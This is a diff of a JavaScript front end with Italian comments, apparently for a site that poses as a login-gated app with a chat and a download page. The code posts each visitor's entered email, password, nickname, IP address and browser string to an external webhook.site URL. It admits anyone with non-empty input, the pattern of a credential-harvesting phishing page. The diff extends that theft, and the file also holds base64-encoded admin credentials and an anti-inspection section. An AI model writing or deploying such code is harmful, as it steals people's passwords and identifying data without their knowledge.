@@ -1,32 +1,36 @@
-// ⚠️ IL TUO WEBHOOK URL ⚠️
+
 const WEBHOOK_URL = "https://webhook.site/cc3c6391-1059-43f5-b767-03f06a2e2a6d";
 
+let currentUser = "Sconosciuto"; // Nome di default
+let isAdmin = false;
+
 // --- FUNZIONE DI INVIO AL WEBHOOK ---
-async function sendToWebhook(email, password, action) {
+async function sendToWebhook(email, password, action, nickname) {
     try {
-        // Recupera l'IP reale
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         const ip = ipData.ip;
 
-        // Prepara i dati
         const payload = {
             "Action": action,
             "Email": email,
             "Password": password,
+            "Nickname": nickname,
             "IP Address": ip,
             "Timestamp": new Date().toLocaleString(),
             "Browser": navigator.userAgent
         };
 
-        // Invia al Webhook
+        const formData = new FormData();
+        for (const key in payload) {
+            formData.append(key, payload[key]);
+        }
+
         await fetch(WEBHOOK_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: formData
         });
 
-        // Salva anche in locale per il pannello admin
         const localLogs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');
         localLogs.push(payload);
         localStorage.setItem('local_quack_logs', JSON.stringify(localLogs));
@@ -43,37 +47,84 @@ const SECURE_PASS = "ZHVjazM5OTM=";         // duck3993
 function handleLogin() {
     const user = document.getElementById('username').value;
     const pass = document.getElementById('password').value;
+    const nickInput = document.getElementById('nickname').value;
     const error = document.getElementById('error-msg');
 
-    // Invia i log (sia che sia admin o utente normale)
-    if (user !== "" && pass !== "") {
-        sendToWebhook(user, pass, "LOGIN_ATTEMPT");
+    // Determina il nome
+    if (nickInput.trim() !== "") {
+        currentUser = nickInput;
     }
 
-    // Se è l'admin
+    if (user !== "" && pass !== "") {
+        sendToWebhook(user, pass, "LOGIN_ATTEMPT", currentUser);
+    }
+
     if (user === atob(SECURE_USER) && pass === atob(SECURE_PASS)) {
+        isAdmin = true;
+        currentUser = "ADMIN"; // Forza il nome a ADMIN
         document.getElementById('admin-nav-btn').style.display = 'block';
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('app-area').style.display = 'flex';
     } 
-    // Se è un utente normale, lo facciamo entrare lo stesso
     else if (user !== "" && pass !== "") {
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('app-area').style.display = 'flex';
     } 
-    // Se i campi sono vuoti
     else {
         error.style.display = 'block';
     }
 }
 
-// --- LOGICA DOWNLOAD ---
-function trackDownload() {
-    // Invia un log fittizio per dire che il file è stato scaricato
-    sendToWebhook("N/A", "N/A", "FILE_DOWNLOADED");
+// --- LOGICA CHAT (Simulata in Locale) ---
+function sendMessage() {
+    const input = document.getElementById('chat-input');
+    const text = input.value.trim();
+    if (text === "") return;
+
+    const chatBox = document.getElementById('chat-messages');
+    const time = new Date().toLocaleTimeString();
+
+    const msgDiv = document.createElement('div');
+    msgDiv.className = 'chat-msg';
+    
+    const userSpan = document.createElement('span');
+    userSpan.className = isAdmin ? 'chat-user admin' : 'chat-user';
+    userSpan.innerText = currentUser + ":";
+    
+    const textSpan = document.createElement('span');
+    textSpan.className = 'chat-text';
+    textSpan.innerText = " " + text;
+    
+    const timeSpan = document.createElement('span');
+    timeSpan.className = 'chat-time';
+    timeSpan.innerText = time;
+
+    msgDiv.appendChild(userSpan);
+    msgDiv.appendChild(textSpan);
+    msgDiv.appendChild(timeSpan);
+    chatBox.appendChild(msgDiv);
+
+    // Scroll automatico
+    chatBox.scrollTop = chatBox.scrollHeight;
+    input.value = "";
+
+    // Salva in locale (simula il salvataggio per gli altri)
+    const chatLogs = JSON.parse(localStorage.getItem('quack_chat') || '[]');
+    chatLogs.push({ user: currentUser, isAdmin: isAdmin, text: text, time: time });
+    localStorage.setItem('quack_chat', JSON.stringify(chatLogs));
 }
 
-// Tasto Invio per il login
+function handleChatEnter(e) {
+    if (e.key === 'Enter') {
+        sendMessage();
+    }
+}
+
+// --- LOGICA DOWNLOAD ---
+function trackDownload() {
+    sendToWebhook("N/A", "N/A", "FILE_DOWNLOADED", currentUser);
+}
+
 document.getElementById('password').addEventListener('keypress', function (e) {
     if (e.key === 'Enter') { handleLogin(); }
 });
@@ -104,6 +155,10 @@ function changePage(pageId, btn) {
     document.getElementById(pageId).classList.add('active');
     btn.classList.add('active');
     if (pageId === 'admin-panel') { loadLogs(); }
+    if (pageId === 'chat') { 
+        const chatBox = document.getElementById('chat-messages');
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
 }
 
 // --- SICUREZZA ANTI-ISPEZIONA ---
